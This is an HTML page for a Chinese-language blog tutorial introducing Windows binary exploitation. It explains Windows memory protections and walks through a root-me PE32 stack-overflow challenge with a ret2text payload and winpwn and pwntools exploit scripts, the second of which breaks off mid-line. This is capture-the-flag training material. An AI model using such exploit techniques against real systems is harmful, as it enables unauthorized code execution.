@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/05/15/winpwn-入门/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Windows pwnReference https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11865?time__1311&#x3D;mqmx0DBD9DyDnDfx4BuQx20Uiph2SDIrhiD&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Fu%2F62994  环境搭建网上找个 Win10 专业版安装就行 安装winpwn 1234pip3 insta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows pwn 入门">
+<meta property="og:url" content="http://example.com/2024/05/15/winpwn-%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Windows pwnReference https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11865?time__1311&#x3D;mqmx0DBD9DyDnDfx4BuQx20Uiph2SDIrhiD&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Fu%2F62994  环境搭建网上找个 Win10 专业版安装就行 安装winpwn 1234pip3 insta">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_10-30-23.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_12-51-39.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_12-55-49.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_12-58-02.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_12-59-43.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-35-41.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-36-43.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-53-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-55-17.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-54-36.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_13-59-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_10-25-48.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_14-08-28.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_14-43-05.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_15-14-51.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_17-46-51.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_17-43-30.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_21-44-57.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_21-50-52.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_21-53-49.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_21-56-22.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_20-20-31.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_22-01-19.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-14_22-03-08.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_16-39-31.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_16-45-12.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_16-46-43.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_16-48-32.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-07-40.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-12-26.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-14-40.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-16-20.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-21-24.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-22-13.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-24-59.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-25-36.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-28-29.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-33-23.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-41-50.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-15_17-43-36.png">
+<meta property="article:published_time" content="2024-05-15T09:45:56.533Z">
+<meta property="article:modified_time" content="2024-05-15T09:52:03.317Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="windows，winpwn， stack，gs， ntdll，ucrtbase">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-05-14_10-30-23.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/icon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Windows pwn 入门 -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Windows pwn 入门</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-05-15 17:45:56</span>
+        <span class="mobile">2024-05-15 17:45:56</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-15 17:52:03</span>
+            <span class="mobile">2024-05-15 17:52:03</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Windows/">Windows</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Windows/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/windows%EF%BC%8Cwinpwn%EF%BC%8C-stack%EF%BC%8Cgs%EF%BC%8C-ntdll%EF%BC%8Cucrtbase/">windows，winpwn， stack，gs， ntdll，ucrtbase</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Windows-pwn"><a href="#Windows-pwn" class="headerlink" title="Windows pwn"></a>Windows pwn</h1><p><strong>Reference</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865?time__1311=mqmx0DBD9DyDnDfx4BuQx20Uiph2SDIrhiD&alichlgref=https://xz.aliyun.com/u/62994" >https://xz.aliyun.com/t/11865?time__1311=mqmx0DBD9DyDnDfx4BuQx20Uiph2SDIrhiD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F62994 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网上找个 Win10 专业版安装就行</p>
+<p><strong>安装winpwn</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install winpwn</span><br><span class="line">pip3 install pefile</span><br><span class="line">pip3 install keystone-engine</span><br><span class="line">pip3 install install capstone</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>安装windbg</strong></p>
+<p>可以直接在商店安装</p>
+<h2 id="windows-保护机制"><a href="#windows-保护机制" class="headerlink" title="windows 保护机制"></a>windows 保护机制</h2><p><strong>NX</strong>：这个在win上其实是DEP，堆栈不可执行保护</p>
+<p><strong>Canary</strong>：这个在win上其实是GS，可能这个工具的开发者为了让我们更好理解才写了Canary，但是需要注意的是这个工具的canary检测可能检测不准</p>
+<p><strong>ASLR</strong>：通俗讲就是地址随机化，让exe和dll的地址全部随机，所以就有了大名鼎鼎<strong>Heap Spray</strong>（堆喷）利用技术，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p>
+<p><strong>Dynamic Base</strong>：程序编译时可通过&#x2F;DYNAMICBASE编译选项指示程序是否利用ASLR的功能</p>
+<p><strong>High Entropy VA</strong>：如果指定此选项，则当内核将进程的地址空间布局随机化为 ASLR 的一部分时，兼容版本的 Windows 内核可以使用更高的熵。 如果内核使用更高的熵，则可以将更多的地址分配给堆栈和堆等内存区域。 因此，更难猜测特定内存区域的位置。当该选项打开时，当这些模块作为 64 位进程运行时，目标可执行文件和它所依赖的任何模块必须能够处理大于 4 GB 的指针值。</p>
+<p><strong>SEH</strong>：结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术。SEH 是 Windows操作系统的一种系统机制，本身与具体的程序设计语言无关。SEH 为Windows的设计者提供了程序错误或异常的处理途径，使得系统更加健壮</p>
+<p><strong>SafeSEH</strong>：为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。不过SafeSEH需要编译器和系统双重支持，缺少一个则保护能力基本就丧失了</p>
+<p><strong>Force Integrity</strong>：强制签名保护</p>
+<p><strong>Control Flow Guard</strong>：控制Flow防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难</p>
+<p><strong>Isolation</strong>：隔离保护，默认会开启</p>
+<p> <strong>Authenticode</strong>：签名保护</p>
+<p>以上是checksec的每个保护机制的简要解释，看到这里可能还会迷迷糊糊的，后续的win pwn文章利用会有绕过这些保护，到时候会详细的解释，包括什么是TIB，TEB等</p>
+<h2 id="ssh-远程连接"><a href="#ssh-远程连接" class="headerlink" title="ssh 远程连接"></a>ssh 远程连接</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sunchong/p/10171870.html" >https://www.cnblogs.com/sunchong/p/10171870.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%B3%BB%E7%BB%9F/PE32-Stack-buffer-overflow-basic" >题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>题目下载命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2225 app-systeme-ch72@challenge05.root-me.org:/challenge/app-systeme/ch72/ch72.exe /home/henry/Documents</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_10-30-23.png"
+                      alt="nipaste_2024-05-14_10-30-2"
+                ></p>
+<p>输入密码 <code>app-systeme-ch72</code> 就可以下载到本地。</p>
+<p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_12-51-39.png"
+                      alt="nipaste_2024-05-14_12-51-3"
+                ></p>
+<p>检查中显示开了 canary，不过在 ida 中没有看到，以ida为准，可能这个 checksec 还是有一些不准。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_12-55-49.png"
+                      alt="nipaste_2024-05-14_12-55-4"
+                ></p>
+<p>通过分析程序，可以发现程序中是给了一个后门函数的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_12-58-02.png"
+                      alt="nipaste_2024-05-14_12-58-0"
+                ></p>
+<p>这就相当于是 ret2text 了，通过设置payload如下，就可以获取到 shell：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  = &#x27;a&#x27; * (0x14 + 4)</span><br><span class="line">payload += p32(0x401000)</span><br></pre></td></tr></table></figure></div>
+
+<p>最终效果如下所示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_12-59-43.png"
+                      alt="nipaste_2024-05-14_12-59-4"
+                ></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ch72.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment"># r.sendline(&#x27;C:\\Windows\\system32\\cmd.exe&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+<h2 id="利用-pwntools-写exp"><a href="#利用-pwntools-写exp" class="headerlink" title="利用 pwntools 写exp"></a>利用 pwntools 写exp</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server" >Win Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以像搭建pwn题一样，把exe给映射到一个端口上</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-35-41.png"
+                      alt="nipaste_2024-05-14_13-35-4"
+                ></p>
+<p>这样通过使用 pwntools 中的工具也是可以直接打通的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-36-43.png"
+                      alt="nipaste_2024-05-14_13-36-4"
+                ></p>
+<p>不过显示可能会出现乱码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ch72.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;192.168.127.141&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = 